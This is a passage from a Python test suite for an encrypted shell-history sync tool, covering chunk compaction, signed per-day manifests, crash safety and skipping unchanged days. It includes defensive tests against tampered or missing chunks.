            before = {c.name for c in archive.iter_chunks(alpha.id)}
            with mock.patch.object(sync, "MAX_EXPORT_BYTES", 512):
                days, replaced, skipped = sync.compact(before="2023-12-01")

            self.assertEqual((days, replaced), (0, 0), "an over-budget day was merged")
            self.assertEqual(skipped, 1)
            self.assertEqual({c.name for c in archive.iter_chunks(alpha.id)}, before)

    def test_a_day_within_the_budget_still_compacts(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            for i in range(4):
                alpha.record("2023-11-14", 1_700_000_000 + i, f"command {i}")
                sync.run()
            days, replaced, skipped = sync.compact(before="2023-12-01")
            self.assertEqual((days, skipped), (1, 0))
            self.assertEqual(replaced, 4)

    def test_a_crash_part_way_through_loses_no_lines(self) -> None:
        """Splitting means more write points, so more chances to die mid-tail.

        The watermark is only saved by a run that finishes, so the next one
        re-reads the whole tail. What must not happen is a line going missing
        or arriving at a peer twice.
        """
        alpha, beta = self.machine("alpha"), self.machine("beta")
        with alpha.active():
            for i in range(200):
                alpha.record("2023-11-14", 1_700_000_000 + i, f"command number {i}")

            real = store.write_atomic
            writes: list[Path] = []

            def die_after_two(path: Path, data: bytes) -> None:
                if path.suffix == ".age" and path.parent.name != "keys":
                    writes.append(path)
                    if len(writes) > 2:
                        raise OSError("interrupted part way through the tail")
                real(path, data)

            with (
                mock.patch.object(sync, "MAX_EXPORT_BYTES", 512),
                mock.patch.object(store, "write_atomic", die_after_two),
                self.assertRaises(OSError),
            ):
                sync.run()

            self.assertEqual(sync.State.load().exported, {}, "a dead run saved a watermark")
            with mock.patch.object(sync, "MAX_EXPORT_BYTES", 512):
                sync.run()

        with beta.active():
            sync.run()
        self.accept_everyone(alpha)
        self.accept_everyone(beta)
        with alpha.active():
            sync.run()
        with beta.active():
            sync.run()
            self.assertEqual(len(beta.commands()), 200)
            self.assertEqual(len(set(beta.commands())), 200, "a line arrived twice")


class TestSplitForExport(unittest.TestCase):
    """The splitter on its own, where the edges are cheap to state."""

    def test_it_is_lossless_and_line_aligned(self) -> None:
        data = b"".join(b"line %d\n" % i for i in range(50))
        for limit in (1, 7, 8, 20, 1000):
            with self.subTest(limit=limit):
                pieces = list(sync.split_for_export(data, limit))
                self.assertEqual(b"".join(pieces), data)
                for piece in pieces:
                    self.assertTrue(piece.endswith(b"\n"))

    def test_a_tail_that_fits_is_one_piece(self) -> None:
        data = b"one\ntwo\n"
        self.assertEqual(list(sync.split_for_export(data, 1000)), [data])

    def test_a_line_longer_than_the_budget_is_kept_whole(self) -> None:
        """Splitting a record would drop it from every reader, not just one."""
        long_line = b"y" * 100 + b"\n"
        pieces = list(sync.split_for_export(long_line + b"short\n", 10))
        self.assertEqual(pieces[0], long_line)
        self.assertEqual(b"".join(pieces), long_line + b"short\n")

    def test_the_budget_is_under_what_a_reader_accepts(self) -> None:
        """The invariant the whole change exists for, stated once."""
        self.assertLess(sync.MAX_EXPORT_BYTES, sync.MAX_CHUNK_BYTES)


class TestADayThatGainsAChunkAfterCompaction(SyncTestCase):
    """Issue #67: a rewrite must rebuild the day from everything, not what is new.

    A compacted chunk keeps its `subsumes` list in the manifest for good, so
    `_Day.open` sees a rewrite on every later pass too. Skipping the chunks
    already in `state.merged` first meant the day was rebuilt from only the
    chunks that happened to be new -- and everything before them was gone from
    the peer's log, silently.

    Reached by `compact` and then `import`, which writes into past days by
    construction.
    """

    def merged_pair(self) -> tuple[Fake, Fake]:
        """alpha with one day of four chunks, and a beta that has merged them."""
        alpha, beta = self.history_across_days(days=1, per_day=4)
        with beta.active():
            sync.run()
            self.assertEqual(len(beta.commands()), 4)
        return alpha, beta

    def test_a_later_chunk_does_not_discard_the_day(self) -> None:
        alpha, beta = self.merged_pair()
        with alpha.active():
            days, _, _ = sync.compact(before="2023-12-01")
            self.assertEqual(days, 1)
            sync.run()
        with beta.active():
            sync.run()
            self.assertEqual(len(beta.commands()), 4, "compaction alone lost history")

        # The trigger: one more line on a day already compacted and merged.
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_100, "later")
            sync.run()
        with beta.active():
            sync.run()
            self.assertEqual(
                sorted(beta.commands()),
                [f"day 0 command {i}" for i in range(4)] + ["later"],
                "the rewrite dropped what had already been merged",
            )

    def test_a_re_read_chunk_is_not_counted_as_newly_merged(self) -> None:
        """Two passes, so the second genuinely re-reads the compacted chunk."""
        alpha, beta = self.merged_pair()
        with alpha.active():
            sync.compact(before="2023-12-01")
            sync.run()
        with beta.active():
            sync.run()  # merges the compacted chunk

        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_100, "later")
            sync.run()
        with beta.active():
            report = sync.run()
            # The compacted chunk is read again to rebuild the day, but only
            # `later` is new. Counting the re-read would tell the user history
            # arrived that they already had.
            self.assertEqual(report.chunks_merged, 1, "a re-read chunk was counted as new")
            self.assertEqual(len(set(beta.commands())), 5)

    def chunks_read(self, machine: Fake) -> list[str]:
        """The chunks one sync on ``machine`` actually decrypts, in order.

        Names rather than a count, because a re-read is far easier to read about
        when the assertion can say which chunks came back.
        """
        opened: list[str] = []
        real = manifest.open_chunk

        def counted(path: Path, digest: str) -> bytes:
            opened.append(path.name)
            return real(path, digest)

        with machine.active(), mock.patch.object(manifest, "open_chunk", counted):
            sync.run()
        return opened

    def test_a_compacted_day_that_keeps_growing_re_reads_only_what_is_new(self) -> None:
        """Issue #69: `subsumes` stays in the manifest, so it cannot mean "rebuild".

        A rewrite re-reads every chunk the manifest lists, which is right on the
        pass the compacted chunk arrives and wrong on every pass after it. Keyed
        on the day merely *having* one, a day that gains a chunk per sync re-read
        one more chunk each time -- linear per sync, quadratic over the day, and
        a day compacted while still being written reaches ~1440 chunks.
        """
        alpha, beta = self.merged_pair()
        with alpha.active():
            self.assertEqual(sync.compact(before="2023-12-01")[0], 1)
            sync.run()
        self.chunks_read(beta)  # the pass that adopts the compaction

        for i in range(6):
            with alpha.active():
                alpha.record("2023-11-14", 1_700_000_600 + i, f"later {i}")
                sync.run()
            # One: the chunk that is actually new. Before #69 this was 2, 3,
            # 4 ... as the day's own chunks were re-read alongside it.
            opened = self.chunks_read(beta)
            self.assertEqual(len(opened), 1, f"pass {i} re-read the day: {opened}")

        with beta.active():
            self.assertEqual(len(beta.commands()), 10)
            self.assertEqual(len(beta.entries()), 10)

    def test_compacting_a_second_time_does_rebuild(self) -> None:
        """The record is the *set* of compacted chunks, not a flag or a count.

        A second compaction replaces one compacted chunk with another, so a flag
        would not change and neither would a count. The peer would then treat the
        new compacted chunk -- a complete statement of the whole day -- as one
        more chunk to append, and write the day twice over.
        """
        alpha, beta = self.merged_pair()
        with alpha.active():
            sync.compact(before="2023-12-01")
            sync.run()
        self.chunks_read(beta)

        with alpha.active():
            for i in range(2):
                alpha.record("2023-11-14", 1_700_000_600 + i, f"later {i}")
                sync.run()
        self.chunks_read(beta)
        with beta.active():
            self.assertEqual(len(beta.entries()), 6)

        with alpha.active():
            self.assertEqual(sync.compact(before="2023-12-01")[0], 1)
            sync.run()
        self.chunks_read(beta)
        with beta.active():
            self.assertEqual(len(beta.entries()), 6, "the day was written twice over")
            self.assertEqual(len(beta.commands()), 6)

    def test_a_rewrite_that_lost_a_chunk_is_tried_again(self) -> None:
        """Recording the rebuild before it succeeded would make the day short.

        The record says "this day was rebuilt from these compacted chunks". If a
        chunk fails on the pass that rewrites -- an unopenable day key, a chunk
        that does not match its digest -- the day on disk does not have it, and
        writing the record anyway means the day is never rebuilt again: the peer
        appends whatever arrives next to a copy that was never rebuilt at all.
        """
        alpha, beta = self.merged_pair()
        with alpha.active():
            sync.compact(before="2023-12-01")
            sync.run()

        def refuse(path: Path, expected: str) -> bytes:
            raise ValueError(f"{path.name} is not the chunk its manifest names")

        with beta.active(), mock.patch.object(manifest, "open_chunk", refuse):
            report = sync.run()
        self.assertIn(f"{alpha.id}/2023-11-14", report.subjects(sync.UNAUTHENTICATED))

        # The next pass must still owe a rewrite. If the failed one was recorded
        # as done, this appends the compacted chunk to a day that still holds
        # every line it replaces.
        self.chunks_read(beta)
        with beta.active():
            self.assertEqual(len(beta.entries()), 4, "the day was written twice over")
            self.assertEqual(len(beta.commands()), 4)

    def test_an_ordinary_day_stays_incremental(self) -> None:
        """Only a rewrite re-reads. Otherwise every sync would redo the day.

        A day with no compacted chunk gains a line: exactly one chunk should be
        decrypted, not every chunk the day holds.
        """
        alpha, beta = self.merged_pair()
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_100, "later")
            sync.run()

        opened = self.chunks_read(beta)
        self.assertEqual(len(opened), 1, f"the whole day was re-read: {opened}")
        with beta.active():
            self.assertEqual(len(beta.commands()), 5)

    def test_a_day_with_nothing_new_reads_no_manifest(self) -> None:
        """The laziness that makes signatures affordable, kept.

        A manifest costs an `ssh-keygen -Y verify`, and sync runs on a
        one-minute timer. Grouping by day must not turn that into one fork per
        day of history per run.

        The day's directory is disturbed first, so the mtime stamp of #85 does
        not skip it before `manifest.read` is ever reached. Without that this
        test passes whether or not the laziness it is named for still exists.
        """
        alpha, beta = self.merged_pair()
        with beta.active():
            stray = archive.chunk_dir(alpha.id, "2023-11-14") / "not-a-chunk"
            stray.write_bytes(b"disturb the day's stamp")
            stray.unlink()

            reads: list[str] = []
            real = manifest.read

            def counted(
                host_id: str, day: str, verify_key: str
            ) -> dict[str, manifest.ManifestEntry]:
                reads.append(day)
                return real(host_id, day, verify_key)

            with mock.patch.object(manifest, "read", counted):
                sync.run()
            self.assertEqual(reads, [], "a day with nothing new still read its manifest")


class TestARewriteIsAllOrNothing(SyncTestCase):
    """Issue #89: a rewrite replaces the day, so a partial one destroys history.

    The chunks a compaction subsumed are unlinked, so their lines exist only
    inside the compacted chunk. A rewrite that cannot open it, but can open
    something else in the day, used to write the day out as that something
    else -- trading lines this machine already had for the ones it could get.
    """

    DAY = "2023-11-14"

    def compacted_and_growing(self) -> tuple[Fake, Fake, str]:
        """A day compacted into one chunk, plus a later one the rewrite can read."""
        alpha, beta = self.history_across_days(days=1, per_day=5)
        with beta.active():
            sync.run()
            self.assertEqual(len(beta.entries()), 5)
        with alpha.active():
            self.assertEqual(sync.compact(before="2023-12-01")[0], 1)
            verify_key = sync.signing_public()
            listed = manifest.read(alpha.id, self.DAY, verify_key)
            compacted = next(name for name, entry in listed.items() if entry.subsumes)
            alpha.record(self.DAY, 1_700_000_600, "and another")
            sync.run()
        return alpha, beta, compacted

    def damaged(self, name: str) -> Callable[[Path, str], bytes]:
        real = manifest.open_chunk

        def refuse(path: Path, expected: str) -> bytes:
            if path.name == name:
                raise ValueError(f"{path.name} is not the chunk its manifest names")
            return real(path, expected)

        return refuse

    def test_a_day_keeps_what_it_had_when_a_chunk_will_not_open(self) -> None:
        alpha, beta, compacted = self.compacted_and_growing()

        with beta.active(), mock.patch.object(manifest, "open_chunk", self.damaged(compacted)):
            report = sync.run()
            self.assertIn(f"{alpha.id}/{self.DAY}", report.subjects(sync.STALE))
            self.assertEqual(len(beta.entries()), 5, "the day was rewritten from a partial read")

            # And it stays whole for as long as the chunk stays damaged.
            for _ in range(3):
                sync.run()
            self.assertEqual(len(beta.entries()), 5)

    def test_the_chunks_it_did_read_are_not_recorded_as_merged(self) -> None:
        """Otherwise the refusal is worse than the truncation it prevents.

        A refused rewrite discards the plaintext it had collected. Marking those
        chunks merged would mean never reading them again -- losing exactly the
        lines the refusal exists to protect.
        """
        alpha, beta, compacted = self.compacted_and_growing()
        with alpha.active():
            readable = next(
                name for name in archive.chunk_names(alpha.id, self.DAY) if name != compacted
            )

        with beta.active(), mock.patch.object(manifest, "open_chunk", self.damaged(compacted)):
            sync.run()
            remembered = sync.State.load().merged.get(f"{alpha.id}/{self.DAY}", set())
        # Not the one that failed, and -- the point -- not the one that read
        # either: its plaintext was discarded with the refused rewrite.
        self.assertNotIn(compacted, remembered)
        self.assertNotIn(readable, remembered, "a discarded chunk was recorded as merged")

        # Once the chunk reads, the day is rebuilt whole: the five it had, plus
        # the one that arrived while it could not be.
        with beta.active():
            sync.run()
            self.assertEqual(len(beta.entries()), 6)
            self.assertIn("and another", beta.commands())

    def test_a_stray_file_does_not_hold_a_rewrite_back(self) -> None:
        """A name the manifest does not list is not part of the day.

        Counting it as a chunk the rewrite failed to get would leave the day
        stale for ever, which is #87 reached by another route -- and anyone with
        push access could arrange it with one byte.
        """
        alpha, beta, _compacted = self.compacted_and_growing()
        with beta.active():
            (archive.chunk_dir(alpha.id, self.DAY) / "1700000000-dead.age").write_bytes(b"x")

            report = sync.run()
            self.assertIn(f"{alpha.id}/{self.DAY}", report.subjects(sync.UNAUTHENTICATED))
            self.assertNotIn(f"{alpha.id}/{self.DAY}", report.subjects(sync.STALE))
            self.assertEqual(len(beta.entries()), 6, "the stray blocked the rebuild")

    def test_a_refused_rewrite_is_never_treated_as_finished(self) -> None:
        """The settle rule reads `state.merged`, which a refusal does not write.

        A rewrite owed because the manifest went *backwards* can leave every
        name it lists already merged -- so "every signed chunk is merged" is
        true while the file was deliberately not rebuilt. Stamping that would
        prune the day and skip it from then on, leaving a log that is wrong and
        never looked at again.
        """
        # Three things at once, which is why the guard is easy to miss: a
        # manifest rolled back to one listing *fewer* chunks (so every name it
        # lists is already merged, and a rebuild is owed because this machine
        # merged one more), something unmerged in the directory (so the day is
        # looked at at all), and one listed chunk that will not open (so the
        # rebuild is refused). Without the guard the day is then pruned and
        # stamped as finished, with a log that was deliberately not rebuilt.
        alpha = self.machine("alpha")
        beta = self.machine("beta")
        key = f"{alpha.id}/{self.DAY}"
        with alpha.active():
            for i in range(4):
                alpha.record(self.DAY, 1_700_000_001 + i, f"early {i}")
                sync.run()
            sync.grant()
        with beta.active():
            sync.run()
            self.assertEqual(len(beta.entries()), 4)
            backup = store.history_dir().with_name("history.backup")
            shutil.copytree(store.history_dir(), backup, symlinks=True)
            first = min(archive.chunk_names(alpha.id, self.DAY))

        with alpha.active():
            alpha.record(self.DAY, 1_700_000_009, "the fifth")
            sync.run()
        with beta.active():
            sync.run()
            self.assertEqual(len(beta.entries()), 5)

            # Working tree only, so HEAD stays put and the rollback sticks.
            live = store.history_dir()
            for entry in live.iterdir():
                if entry.name != ".git":
                    shutil.rmtree(entry) if entry.is_dir() else entry.unlink()
            for entry in backup.iterdir():
                if entry.name != ".git":
                    if entry.is_dir():
                        shutil.copytree(entry, live / entry.name, symlinks=True)
                    else:
                        shutil.copy2(entry, live / entry.name)

            # ...and something unmerged in the directory, or the day has
            # nothing fresh and is skipped before any of this is reached.
            (archive.chunk_dir(alpha.id, self.DAY) / "1700000000-dead.age").write_bytes(b"x")

        self.settle(beta, alpha, self.DAY)
        with beta.active(), mock.patch.object(manifest, "open_chunk", self.damaged(first)):
            self.assertIn(key, sync.run().subjects(sync.STALE))
            self.assertNotIn(key, sync.State.load().merged_at, "a refused rewrite was stamped")
            self.assertEqual(len(beta.entries()), 5, "the day was rebuilt from a partial read")

    def test_sync_says_which_day_it_left_alone(self) -> None:
        """New user-facing behaviour, so it is pinned like its neighbours."""
        alpha, beta, compacted = self.compacted_and_growing()
        with mock.patch.object(manifest, "open_chunk", self.damaged(compacted)):
            ran = self.run_cli(beta, "sync")
        self.assertEqual(ran.code, 0)
        said = ran.err
        self.assertIn("could not be rebuilt", said)
        self.assertIn(f"{alpha.id}/{self.DAY}", said, "it did not say which day")

    def test_a_chunk_deleted_from_the_repo_does_not_truncate_the_day(self) -> None:
        """The route with no mock in it, and the one that said nothing.

        A chunk the manifest lists but that is *absent* never reaches the merge
        loop, so measuring what was missed against the directory counted it as
        nothing to miss: the day was rewritten without it, five commands became
        one, and neither `stale` nor `unauthenticated` fired. Anyone with push
        access can delete a chunk; woswoar itself never does.
        """
        alpha, beta, compacted = self.compacted_and_growing()
        with alpha.active():
            (archive.chunk_dir(alpha.id, self.DAY) / compacted).unlink()
            self.publish_repo_edit()

        with beta.active():
            report = sync.run()
            self.assertIn(f"{alpha.id}/{self.DAY}", report.subjects(sync.STALE))
            self.assertEqual(len(beta.entries()), 5, "the day was rewritten without it")
            for _ in range(3):
                sync.run()
            self.assertEqual(len(beta.entries()), 5)

    def test_a_machine_awaiting_grant_is_not_told_its_history_is_damaged(self) -> None:
        """An unopenable day key skips every chunk, which is not damage.

        It is the ordinary state of a machine between `init` and someone running
        `grant`, which the rest of the output goes out of its way to describe as
        expected. Nothing decrypted, so there was never a partial rewrite to
        refuse -- and `unreadable` already names the day with the right remedy.
        """
        alpha, _beta = self.history_across_days(days=1, per_day=3)
        with alpha.active():
            self.assertEqual(sync.compact(before="2023-12-01")[0], 1)
            sync.run()

        gamma = self.machine("gamma")  # enrolled, never granted
        ran = self.run_cli(gamma, "sync")
        self.assertEqual(ran.code, 0)
        said = ran.err
        self.assertIn(_GRANT_REMEDY.splitlines()[0], said)
        self.assertNotIn("could not be rebuilt", said, "an ungranted machine was accused")

    def test_appending_is_still_allowed_to_be_partial(self) -> None:
        """Only a rewrite is all-or-nothing.

        An append adds to what is there, and `_Day.add` may already have flushed
        part of it, so refusing the whole pass would strand chunks that are
        already on disk -- and gains nothing, since nothing was replaced.
        """
        alpha, beta = self.history_across_days(days=1, per_day=2)
        with beta.active():
            sync.run()
        with alpha.active():
            for i in range(2):
                alpha.record(self.DAY, 1_700_000_700 + i, f"later {i}")
                sync.run()
            names = archive.chunk_names(alpha.id, self.DAY)

        with beta.active(), mock.patch.object(manifest, "open_chunk", self.damaged(names[-1])):
            report = sync.run()
            self.assertNotIn(f"{alpha.id}/{self.DAY}", report.subjects(sync.STALE))
            # The one that read was kept, rather than held back with the other.
            self.assertEqual(len(beta.entries()), 3)
        with beta.active():
            sync.run()
            self.assertEqual(len(beta.entries()), 4)


class TestADayIsWhatItsManifestSays(SyncTestCase):
    """Issues #86 and #87: the signed manifest is the statement of a day.

    Judging a day by what is *in its directory* gets both wrong. A name the
    manifest does not list is not part of the day, so waiting for it to be
    merged waits for ever; and a name the manifest no longer lists is a chunk
    compaction replaced, so remembering it for ever makes `state.json` grow
    while the archive it describes shrinks.
    """

    DAY = "2023-11-14"

    def verifications(self, machine: Fake) -> int:
        """Manifest signature checks one sync makes -- an `ssh-keygen` fork each."""
        seen = 0
        real = crypto.verify

        def counted(*args: object, **kwargs: object) -> bool:
            nonlocal seen
            seen += 1
            return real(*args, **kwargs)  # type: ignore[arg-type]

        with machine.active(), mock.patch.object(crypto, "verify", counted):
            sync.run()
        return seen

    def remembered(self, machine: Fake, host: Fake) -> set[str]:
        with machine.active():
            return set(sync.State.load().merged.get(f"{host.id}/{self.DAY}", set()))

    def test_a_stray_file_is_reported_once_and_then_settles(self) -> None:
        """#87: an unlistable name must not hold the day open for ever.

        Before, the day was never complete, so every sync re-listed it *and*
        re-verified its manifest -- a fork a minute, which anyone with push
        access could turn on with one byte.
        """
        alpha, beta = self.history_across_days(days=1, per_day=2)
        with beta.active():
            sync.run()
            (archive.chunk_dir(alpha.id, self.DAY) / "1700000000-dead.age").write_bytes(b"x")
        self.settle(beta, alpha, self.DAY)

        # Said once, because the day did change -- and that pass is the one
        # that pays for the manifest.
        with beta.active():
            self.assertIn(f"{alpha.id}/{self.DAY}", sync.run().subjects(sync.UNAUTHENTICATED))
        # Then never again while the directory is untouched. Settling here would
        # move the mtime and legitimately earn another look.
        self.assertEqual([self.verifications(beta) for _ in range(3)], [0, 0, 0])
        with beta.active():
            self.assertEqual(len(beta.commands()), 2, "the day's own history was lost")
        # And the stray is not recorded as merged. It never was -- and a name
        # remembered as merged is one that would be skipped if a manifest ever
        # did list it, taking its lines with it.
        self.assertNotIn("1700000000-dead.age", self.remembered(beta, alpha))

    def test_compaction_shrinks_what_is_remembered(self) -> None:
        """#86: `state.json` is read and compared every sync, and only grew."""
        alpha, beta = self.history_across_days(days=1, per_day=6)
        with beta.active():
            sync.run()
        self.assertEqual(len(self.remembered(beta, alpha)), 6)

        with alpha.active():
            self.assertEqual(sync.compact(before="2023-12-01")[0], 1)
            sync.run()
        with beta.active():
            sync.run()

        with alpha.active():
            live = set(archive.chunk_names(alpha.id, self.DAY))
        self.assertEqual(self.remembered(beta, alpha), live, "names of chunks that are gone")
        with beta.active():
            self.assertEqual(len(beta.commands()), 6, "compaction lost history")

    def test_a_day_whose_manifest_went_backwards_is_rebuilt(self) -> None:
        """What pruning gives up, and how it is paid for.

        Before the prune, `state.merged` remembered every chunk this machine had
        ever merged, so a working tree rolled back to before a compaction simply
        found them all already merged. Pruned, it remembers only the compacted
        chunk -- and the old manifest's chunks look new, so appending them writes
        the day's lines a second time.

        The signal is the manifest having *lost* a name this machine merged,
        which cannot happen while a day only grows. Rebuilding from what it now
        lists is right whether the rollback is a restore, a half-applied backup,
        or a `git checkout` of an older commit over the working tree.
        """
        alpha, beta = self.history_across_days(days=1, per_day=4)
        with beta.active():
            sync.run()
            self.assertEqual(len(beta.entries()), 4)
            backup = store.history_dir().with_name("history.backup")
            shutil.copytree(store.history_dir(), backup, symlinks=True)

        with alpha.active():
            self.assertEqual(sync.compact(before="2023-12-01")[0], 1)
            sync.run()
        with beta.active():
            sync.run()
            self.assertEqual(len(self.remembered(beta, alpha)), 1, "the prune did not happen")

            # The working tree only: HEAD stays where it is, so the next fetch
            # finds nothing to bring forward and the rollback sticks.
            live = store.history_dir()
            for entry in live.iterdir():
                if entry.name != ".git":
                    shutil.rmtree(entry) if entry.is_dir() else entry.unlink()
            for entry in backup.iterdir():
                if entry.name != ".git":
                    if entry.is_dir():
                        shutil.copytree(entry, live / entry.name, symlinks=True)
                    else:
                        shutil.copy2(entry, live / entry.name)

            for _ in range(3):
                sync.run()
            self.assertEqual(len(beta.entries()), 4, "the day was written twice over")
            self.assertEqual(beta.commands(), {f"day 0 command {i}" for i in range(4)})

    def test_a_manifest_that_will_not_verify_settles_nothing(self) -> None:
        """The hazard both halves share, and the one that loses history.

        `manifest.read` answers with *nothing* for a manifest that is missing,
        unsigned or mis-signed -- not because the day is empty. Treating that as
        "every signed chunk is merged" would stamp a day whose chunks are all
        still being refused, and would prune the day's record to nothing. The
        day would then be merged again from scratch, and `_Day` appends: every
        line twice.
        """
        alpha, beta = self.history_across_days(days=1, per_day=2)
        with beta.active():
            sync.run()
        before = self.remembered(beta, alpha)
        self.assertEqual(len(before), 2)

        # A chunk arrives *and* the manifest stops verifying, so the day has to
        # be looked at and then cannot be trusted. Wrecking it alone would leave
        # the day settled and never consulted, which is its own right answer.
        with alpha.active():
            alpha.record(self.DAY, 1_700_000_003, "a third line")
            sync.run()
            archive.day_manifest(alpha.id, self.DAY).write_text("wrecked", encoding="utf-8")
            self.publish_repo_edit()

        with beta.active():
            sync.run()
            self.assertEqual(
                self.remembered(beta, alpha),
                before,
                "an unverifiable manifest emptied the day's record",
            )
            # Not stamped *as it now stands*. An older stamp from the last
            # good sync may still be recorded; what matters is that it does not
            # match, so the day keeps being looked at.
            self.assertNotEqual(
                sync.State.load().merged_at.get(f"{alpha.id}/{self.DAY}"),
                archive.day_stamp(alpha.id, self.DAY),
                "an unverifiable manifest settled the day",
            )
            # And nothing was written twice.
            self.assertEqual(len(beta.entries()), 2)


class TestSkippingAnUnchangedDay(SyncTestCase):
    """Issue #85: listing a peer's archive is what an idle merge costs.

    A day directory's mtime moves when a chunk lands in it, so a day whose stamp
    is unchanged since it was merged has nothing new -- and needs no listing. At
    20k chunks over 40 days that is 0.18 ms of stats against 4.96 ms of listing,
    once a minute, per peer.
    """

    #: The days `history_across_days` writes.
    DAYS: ClassVar[tuple[str, ...]] = ("2023-11-14", "2023-11-15")

    def listed(self, machine: Fake) -> list[str]:
        """The days one sync actually lists the chunks of."""
        days: list[str] = []
        real = archive.chunk_names

        def counted(machine_id: str, day: str) -> list[str]:
            days.append(day)
            return real(machine_id, day)

        with machine.active(), mock.patch.object(archive, "chunk_names", counted):
            sync.run()
        return days

    def pair(self) -> tuple[Fake, Fake]:
        """alpha with two days of one chunk, and a beta that has merged both."""
        alpha, beta = self.history_across_days(days=2, per_day=1)
        with beta.active():
            sync.run()
            self.assertEqual(len(beta.commands()), 2)
        # Settled, then one more pass so the stamps are recorded.
        self.settle(beta, alpha, *self.DAYS)
        with beta.active():
            sync.run()
        return alpha, beta

    def test_a_merged_day_is_not_listed_again(self) -> None:
        _alpha, beta = self.pair()
        self.assertEqual(self.listed(beta), [], "an unchanged day was listed")
        # ...and the history is still there, which is the point of not looking.
        with beta.active():
            self.assertEqual(len(beta.commands()), 2)

    def test_a_day_that_gains_a_chunk_is_listed_and_merged(self) -> None:
        """The half that would silently stop merging if the skip overreached."""
        alpha, beta = self.pair()
        with alpha.active():
            alpha.record("2023-11-15", 1_700_000_002, "a later line")
            sync.run()

        self.assertEqual(self.listed(beta), ["2023-11-15"])
        with beta.active():
            self.assertIn("a later line", beta.commands())

        # And once the day has been still long enough to be trusted, it settles
        # rather than re-listing for ever. Until then it is looked at again --
        # deliberately, since its mtime cannot yet rule out another write.
        self.assertEqual(self.listed(beta), ["2023-11-15"])
        self.settle(beta, alpha, "2023-11-15")
        self.assertEqual(self.listed(beta), ["2023-11-15"])
        self.assertEqual(self.listed(beta), [])

    def test_a_day_left_short_is_looked_at_again(self) -> None:
        """A stamp must mean "merged", not "looked at".

        A chunk that would not open leaves the day incomplete. Stamping it would
        say the day is finished, and nothing would ever read that chunk again --
        the same trap #69 hit by recording a rebuild that had failed.
        """
        alpha, beta = self.pair()
        with alpha.active():
            alpha.record("2023-11-15", 1_700_000_002, "a later line")
            sync.run()

        def refuse(path: Path, expected: str) -> bytes:
            raise ValueError(f"{path.name} is not the chunk its manifest names")

        # Twice, with a settle between. The first pass is what *fetches* the
        # chunk, so it leaves the directory freshly written and the racy window
        # would keep the day being read again whatever the completeness rule
        # said. The second runs against a day that is settled and still short --
        # the only state in which the rule is the thing being tested.
        with beta.active(), mock.patch.object(manifest, "open_chunk", refuse):
            sync.run()
        self.settle(beta, alpha, "2023-11-15")
        with beta.active(), mock.patch.object(manifest, "open_chunk", refuse):
            report = sync.run()
        self.assertIn(f"{alpha.id}/2023-11-15", report.subjects(sync.UNAUTHENTICATED))

        # Nothing changed on disk, so only an unstamped day gets a second look.
        self.assertEqual(self.listed(beta), ["2023-11-15"])
        with beta.active():
            self.assertIn("a later line", beta.commands())

    def test_a_day_whose_directory_changed_is_listed_again(self) -> None:
        """The stamp is the whole test, so a moved stamp must be believed.

        And then re-recorded. A day that is looked at, found to hold nothing
        new, and left unstamped would be listed again on every sync for ever --
        which is what a single stray file in a peer's directory would cost.
        """
        alpha, beta = self.pair()
        with beta.active():
            stray = archive.chunk_dir(alpha.id, "2023-11-14") / "not-a-chunk"
            stray.write_bytes(b"something landed in the directory")
        self.assertEqual(self.listed(beta), ["2023-11-14"])
        self.settle(beta, alpha, "2023-11-14")
        self.assertEqual(self.listed(beta), ["2023-11-14"])
        self.assertEqual(self.listed(beta), [], "a stray file re-listed the day for ever")

    def test_a_chunk_arriving_mid_listing_is_not_stamped_over(self) -> None:
        """Why the stamp is read *before* the listing, not after.

        Read after, a chunk that lands between the two is missing from the names
        but covered by the stamp -- so the day looks finished, is skipped from
        then on, and those commands are never merged. Read before, the same
        chunk is either in the listing or under a stamp that no longer matches.

        The arrival is forced here rather than raced for: `chunk_names` drops a
        real chunk into the directory the instant after it has listed it, which
        is the one interleaving that matters.
        """
        alpha, beta = self.pair()
        with alpha.active():
            alpha.record("2023-11-15", 1_700_100_002, "arrived mid-listing")
            sync.run()
            source = archive.chunk_dir(alpha.id, "2023-11-15")
            late = max(archive.chunk_names(alpha.id, "2023-11-15"))
            payload = (source / late).read_bytes()

        real = archive.chunk_names
        dropped = False

        def racing(machine_id: str, day: str) -> list[str]:
            nonlocal dropped
            names = real(machine_id, day)
            if day == "2023-11-15" and not dropped:
                dropped = True
                names = [name for name in names if name != late]
                (archive.chunk_dir(machine_id, day) / late).write_bytes(payload)
            return names

        with beta.active(), mock.patch.object(archive, "chunk_names", racing):
            sync.run()
        self.assertTrue(dropped, "the race was never reached")

        # The chunk was invisible to that pass. It must not have been stamped
        # over: the next sync has to look again and take it.
        self.settle(beta, alpha, "2023-11-15")
        with beta.active():
            sync.run()
            self.assertIn("arrived mid-listing", beta.commands())

    def test_a_day_shaped_directory_holding_nothing_is_not_stamped(self) -> None:
        """`state.json` is read and compared every sync, so what goes in it lasts.

        A directory named like a day but holding no chunk is not a day (see
        `archive.iter_chunk_days`). Stamping one would leave a permanent entry for
        something that was never there -- and this file already only grows.
        """
        alpha, beta = self.pair()
        with beta.active():
            hollow = archive.chunk_dir(alpha.id, "2023-11-20")
            hollow.mkdir(parents=True, exist_ok=True)
        # Old enough that the racy window is not what is keeping it unstamped.
        self.settle(beta, alpha, "2023-11-20")
        with beta.active():
            sync.run()
            self.assertNotIn(f"{alpha.id}/2023-11-20", sync.State.load().merged_at)
            # The days that *are* days still are.
            self.assertIn(f"{alpha.id}/2023-11-14", sync.State.load().merged_at)


class TestWalkingAPeersChunks(SyncTestCase):
    """Issue #82: `merge` walks every peer's whole tree on every sync.

    Its idle answer is "nothing new", decided from chunk *names*, so building a
    `Path` and a `Chunk` per file first was the entire cost: 71.5 ms against
    8.5 ms for one peer with 20k chunks, once a minute, growing with the archive.
    """

    #: Recorded newest-day-first, deliberately. Two days cannot tell a sorted
    #: walk from a reversed one, and creation order is not incidental: on btrfs
    #: -- the filesystem this is developed on -- `readdir` returns entries in
    #: the order they were made, so an unsorted walk comes back wrong here and
    #: would pass on the tmpfs the suite's temporary directories land in.
    DAYS: ClassVar[tuple[str, ...]] = ("2023-11-16", "2023-11-14", "2023-11-15")

    def stocked(self) -> tuple[Fake, Fake]:
        """alpha with three days of two chunks each, and a beta that merged them."""
        alpha = self.machine("alpha")
        beta = self.machine("beta")
        with alpha.active():
            for day in self.DAYS:
                for i in range(2):
